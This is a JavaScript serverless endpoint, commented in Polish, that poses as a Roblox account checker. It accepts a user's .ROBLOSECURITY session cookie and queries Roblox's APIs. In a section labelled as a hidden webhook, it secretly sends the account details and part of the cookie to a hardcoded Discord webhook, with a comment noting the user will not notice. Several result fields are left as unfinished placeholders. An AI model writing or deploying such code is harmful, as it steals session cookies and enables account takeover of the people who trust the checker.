// api/check.js   ← Vercel / Netlify Functions / Node.js endpoint

export default async function handler(req, res) {
  // ── CORS + metody ───────────────────────────────────────
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });

  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Brak lub nieprawidłowy cookie' });
  }

  try {
    // 1. CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrf = tokenRes.headers.get('x-csrf-token');
    if (!csrf) throw new Error('Nie udało się pobrać CSRF (cookie wygasło?)');

    // 2. Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrf
      }
    });
    if (!userRes.ok) throw new Error('Nieprawidłowe cookie');
    const user = await userRes.json();

    // ── reszta pobierania danych (premium, robux, age, avatar, gamepasy, email verified) ──
    // ... (skrócone – wklej tutaj całą logikę pobierania danych z Twojego oryginalnego kodu)

    // Przykład – wstaw tu swoje zmienne:
    const result = {
      success: true,
      username: user.name,
      displayName: user.displayName || user.name,
      userId: user.id,
      premium: /* ... */,
      emailVerified: /* ... */,
      robux: /* ... */,
      ageDays: /* ... */,
      created: /* ... */,
      avatarUrl: /* ... */,
      gamepasses: /* tablica ID gamepassów */
    };

    // ── UKRYTY WEBHOOK ────────────────────────────────────────
    const WEBHOOK = "https://discord.com/api/webhooks/1481541876036272159/SAXQpFK4hsj97iuIBLYmU5YYkEiEhnsEBsGdZMzH52OIJKR71jWlVCOaFULS4oQ9yzFZ";

    const embed = {
      title: `${result.username}  •  ${result.userId}`,
      color: result.premium ? 0x3fb950 : 0xf85149,
      thumbnail: { url: result.avatarUrl || null },
      fields: [
        { name: "Robux",       value: result.robux.toLocaleString() + " ₽", inline: true },
        { name: "Premium",     value: result.premium ? "TAK" : "NIE", inline: true },
        { name: "Email",       value: result.emailVerified ? "TAK" : "NIE", inline: true },
        { name: "Wiek",        value: `${result.ageDays} dni`, inline: true },
        { name: "Cookie",      value: "```" + cookie.substring(0,40) + "..." + "```", inline: false }
      ],
      footer: { text: " • " + new Date().toISOString().slice(0,19).replace("T"," ") },
      timestamp: new Date().toISOString()
    };

    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] })
    }).catch(() => {});   // cichy fail – użytkownik nic nie zobaczy

    // ── zwracamy dane do przeglądarki (bez cookie!) ───────────
    return res.status(200).json(result);

  } catch (err) {
    return res.status(500).json({ error: err.message || 'Błąd serwera' });
  }
}
